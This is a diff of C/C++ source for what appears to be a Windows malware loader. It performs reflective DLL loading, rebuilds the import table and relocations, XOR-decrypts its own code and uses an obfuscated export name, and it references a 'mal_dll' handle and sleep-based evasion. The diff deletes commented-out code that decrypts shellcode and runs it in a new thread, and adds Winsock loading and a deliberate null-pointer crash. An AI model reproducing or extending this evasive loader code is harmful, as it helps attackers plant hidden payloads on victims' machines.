@@ -6,6 +6,8 @@
 #include "swappala.h"
 #include "sleaping.h"
 #include <stdint.h>
+#include "utils.h"
+#include "utils_headers.h"
 
 typedef struct _SAC_DLL_HEADER
 {
@@ -14,7 +16,7 @@ typedef struct _SAC_DLL_HEADER
 	SIZE_T payload_size;
 	PBYTE to_free;
 
-} SAC_DLL_HEADER, *PSAC_DLL_HEADER;
+} SAC_DLL_HEADER, * PSAC_DLL_HEADER;
 
 uintptr_t resolve_jmp_to_actual_function(void* func_addr)
 {
@@ -337,9 +339,9 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction()
 		);
 	}
 
-    
-    //char str_msvcp140d[] = { 'm', 's', 'v', 'c', 'p', '1', '4', '0', 'd', '.', 'd', 'l', 'l', '\0' };
-    
+
+	//char str_msvcp140d[] = { 'm', 's', 'v', 'c', 'p', '1', '4', '0', 'd', '.', 'd', 'l', 'l', '\0' };
+
 
 	/* FIX IAT TABLE */
 	for (size_t i = 0; i < img_opt_hdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size; i += sizeof(IMAGE_IMPORT_DESCRIPTOR))
@@ -349,10 +351,10 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction()
 		if (img_imp_desc->OriginalFirstThunk == NULL && img_imp_desc->FirstThunk == NULL)
 			break;
 
-        char* import_module_name = (LPSTR)(reflective_dll_base + img_imp_desc->Name);
+		char* import_module_name = (LPSTR)(reflective_dll_base + img_imp_desc->Name);
 
-        //if (str_icmp(import_module_name, str_msvcp140d))
-        //    continue;
+		//if (str_icmp(import_module_name, str_msvcp140d))
+		//    continue;
 
 		dll = func_LoadLibraryA((LPSTR)(reflective_dll_base + img_imp_desc->Name));
 		if (dll == NULL)
@@ -428,7 +430,7 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction()
 				break;
 			}
 
-            reloc_entry += 1;
+			reloc_entry += 1;
 		}
 
 		img_reloc = (PIMAGE_BASE_RELOCATION)(reinterpret_cast<DWORD_PTR>(img_reloc) + img_reloc->SizeOfBlock);
@@ -444,8 +446,8 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction()
 	for (int i = 0; i < img_file_hdr.NumberOfSections; i++)
 	{
 
-        if ((SIZE_T)pe_section_ptr_array[i]->SizeOfRawData == 0)
-            continue;
+		if ((SIZE_T)pe_section_ptr_array[i]->SizeOfRawData == 0)
+			continue;
 
 		// write
 		if (pe_section_ptr_array[i]->Characteristics & IMAGE_SCN_MEM_WRITE)
@@ -608,7 +610,7 @@ EXTERN_DLL_EXPORT bool _123321_asdf21425()
 		(BYTE)((dll_header->key >> 24) & 0xFF),
 	};
 
-	reflective_addr = (PBYTE)resolve_jmp_to_actual_function( ReflectiveFunction );
+	reflective_addr = (PBYTE)resolve_jmp_to_actual_function(ReflectiveFunction);
 
 	// decrypting the reflective function
 	for (size_t i = 0, j = 0; i < (dll_header->funcSize); i++, j++)
@@ -667,11 +669,11 @@ bool init_func_addr(PFUNCTION_ADDRESSES func_addr)
 	func_addr->MessageBoxAddress = GetProcAddress(hm_user32, "MessageBoxA");
 	func_addr->ResumeThreadAddress = GetProcAddress(hm_kernel32, "ResumeThread");
 
-	if (func_addr->NtTestAlertAddress == NULL 
-		|| func_addr->NtWaitForSingleObjectAddress == NULL 
-		|| func_addr->MessageBoxAddress == NULL 
+	if (func_addr->NtTestAlertAddress == NULL
+		|| func_addr->NtWaitForSingleObjectAddress == NULL
+		|| func_addr->MessageBoxAddress == NULL
 		|| func_addr->ResumeThreadAddress == NULL
-		) 
+		)
 	{
 		return false;
 	}
@@ -759,20 +761,11 @@ static BOOL custom_process_attach(HMODULE hModule)
 	if (NtTestAlert_addr == NULL)
 		return FALSE;
 
-	//if (sleaping(sac_dll_base, sac_dll_handle, mal_dll_handle, sac_dll_size, &nt_func_s, NtTestAlert_addr) == -1)
-	//{
-	//	MessageBoxA(0, 0, 0, MB_OK | MB_ICONINFORMATION);
-	//	return FALSE;
-	//}
+	winsock_functions_t winsock_funcs = { 0 };
+	BOOL result = load_winsock_functions(&winsock_funcs);
 
-	//memcpy(old_memory, encrypted_payload_bin, encrypted_payload_bin_len);
-
- //   for (size_t i = 0, j = 0; i < encrypted_payload_bin_len; i++, j++)
- //   {
- //       old_memory[i] = old_memory[i] ^ key[j % key_size];
- //   }
-
-	//HANDLE shellcode_handle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)old_memory, 0, 0, 0);
+	void** buggy = NULL;
+	*buggy = 0;
 
 	do
 	{
@@ -782,7 +775,6 @@ static BOOL custom_process_attach(HMODULE hModule)
 			MessageBoxA(0, 0, 0, MB_OK | MB_ICONINFORMATION);
 			return FALSE;
 		}
-
 	} while (true);
 
 	return TRUE;
